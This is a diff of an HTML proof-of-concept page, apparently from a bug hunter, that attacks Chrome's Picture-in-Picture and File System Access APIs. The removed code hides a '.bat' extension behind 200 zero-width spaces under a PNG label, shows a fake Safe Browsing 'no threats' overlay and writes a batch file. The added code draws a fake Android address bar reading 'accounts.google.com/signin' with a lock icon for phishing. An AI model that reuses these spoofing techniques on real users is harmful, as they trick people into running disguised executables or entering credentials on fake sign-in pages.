@@ -2,83 +2,75 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FSA API Exploit Research - FARISSAL B</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Chrome Security Lab - FARISSAL B</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #121212; color: white; text-align: center; padding-top: 100px; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        #saveBtn { background: #4285f4; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        #saveBtn:hover { background: #357ae8; transform: translateY(-2px); }
-        .log-box { margin-top: 20px; background: #000; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #0f0; text-align: left; max-width: 400px; height: 80px; overflow-y: auto; border: 1px solid #222; }
+        body { 
+            margin: 0; background: #121212; color: #fff; font-family: sans-serif; 
+            display: flex; align-items: center; justify-content: center; height: 100vh; 
+        }
+        .card { 
+            background: #1e1e1e; padding: 30px; border-radius: 20px; 
+            border: 1px solid #333; width: 85%; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        #startBtn { 
+            background: #8ab4f8; color: #202124; border: none; padding: 18px; 
+            border-radius: 50px; font-weight: bold; width: 100%; font-size: 16px;
+            cursor: pointer;
+        }
+        .status { 
+            margin-top: 20px; font-family: monospace; font-size: 11px; color: #81c995; 
+            text-align: left; background: #000; padding: 10px; border-radius: 10px;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Security Research Center</h2>
-    <p>Target: FSA API & Document PiP Integration</p>
-    <button id="saveBtn">GET VERIFIED PHOTO (.PNG)</button>
-    <div id="logBox" class="log-box">> System ready... awaiting gesture.</div>
+    <h2 style="color: #8ab4f8; margin-top: 0;">Chrome Exploit</h2>
+    <p style="color: #9aa0a6; font-size: 13px;">Target: Address Bar Redressing (Android)</p>
+    
+    <button id="startBtn">START RESEARCH SESSION</button>
+    
+    <div id="log" class="status">> Ready for HTTPS execution...</div>
 </div>
 
 <script>
-    const logBox = document.getElementById('logBox');
-    const addLog = (msg) => { logBox.innerHTML += `<br>> ${msg}`; logBox.scrollTop = logBox.scrollHeight; };
+    const log = document.getElementById('log');
+    const addLog = (m) => { log.innerHTML += `<br>> ${m}`; log.scrollTop = log.scrollHeight; };
 
-    document.getElementById('saveBtn').addEventListener('click', async () => {
-        addLog("Button clicked. Triggering concurrent requests...");
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        addLog("Requesting PiP Window...");
 
         try {
-            // 1. SIAPKAN PIP (JANGAN PAKE AWAIT DULU)
-            // Ini biar request PiP jalan di background tanpa nahan 'User Gesture'
-            const pipPromise = documentPictureInPicture.requestWindow({
-                width: 450,
-                height: 150,
+            // Meminta PiP Window (Wajib HTTPS agar tidak error)
+            const pipWin = await documentPictureInPicture.requestWindow({
+                width: window.screen.width,
+                height: 150
             });
 
-            // 2. LANGSUNG PANGGIL FILE PICKER (DENGAN AWAIT)
-            // Karena ini dipanggil tepat setelah klik, Chrome bakal ngizinin.
-            const handle = await window.showSaveFilePicker({
-                suggestedName: 'wallpaper_ultra_hd_collection_2026_id_FARISSALB' + '\u200B'.repeat(200) + '.bat',
-                types: [{
-                    description: 'Portable Network Graphics (PNG)',
-                    accept: { 'image/png': ['.png'] }
-                }],
-            });
+            addLog("SUCCESS: PiP Active!");
 
-            addLog("File handle obtained.");
-
-            // 3. BARU URUS PIP NYA SETELAH DIALOG MUNCUL
-            const pipWin = await pipPromise;
-            
-            // Posisikan PiP tepat di atas area deskripsi tipe file
-            // Koordinat ini biasanya pas untuk Windows 10/11
-            pipWin.moveTo(window.screen.width - 500, window.screen.height - 400);
-
+            // Desain Bar Alamat Palsu (Warna & Font Mirip Chrome Android Asli)
             pipWin.document.body.style.margin = "0";
+            pipWin.document.body.style.padding = "0";
+            pipWin.document.body.style.overflow = "hidden";
+            pipWin.document.body.style.background = "#ffffff";
+
             pipWin.document.body.innerHTML = `
-                <div style="background: #ffffff; color: #1a73e8; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; border: 4px solid #1a73e8;">
-                    <div style="font-weight: bold; font-size: 18px;">🛡️ File Verified</div>
-                    <div style="font-size: 12px; color: #5f6368;">No threats detected by Chrome Safe Browsing</div>
-                    <div style="margin-top: 10px; width: 80%; background: #e8f0fe; height: 5px; border-radius: 10px;">
-                        <div style="width: 100%; background: #1a73e8; height: 100%; border-radius: 10px;"></div>
+                <div style="height: 100vh; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #dadce0; font-family: sans-serif;">
+                    <div style="background-color: #f1f3f4; border-radius: 24px; padding: 10px 20px; width: 100%; display: flex; align-items: center; gap: 12px;">
+                        <span style="font-size: 18px;">🔒</span>
+                        <span style="color: #202124; font-size: 15px; font-weight: 400;">accounts.google.com/signin</span>
+                        <span style="margin-left: auto; color: #5f6368; font-size: 16px;">⋮</span>
                     </div>
                 </div>
             `;
 
-            addLog("Security overlay deployed.");
-
-            // 4. TULIS PAYLOAD JAHAT
-            const writable = await handle.createWritable();
-            await writable.write("@echo off\nmsg * HACKED BY FARISSAL B\necho Bug Hunter: FARISSAL B\npause");
-            await writable.close();
-
-            addLog("EXPLOIT SUCCESS: File saved.");
-            
-            // Tutup PiP otomatis setelah 3 detik
-            setTimeout(() => { pipWin.close(); }, 3000);
-
         } catch (err) {
             addLog("ERROR: " + err.message);
+            alert("Error: " + err.message + "\n\nSal, pastiin lo buka link HTTPS!");
         }
     });
 </script>
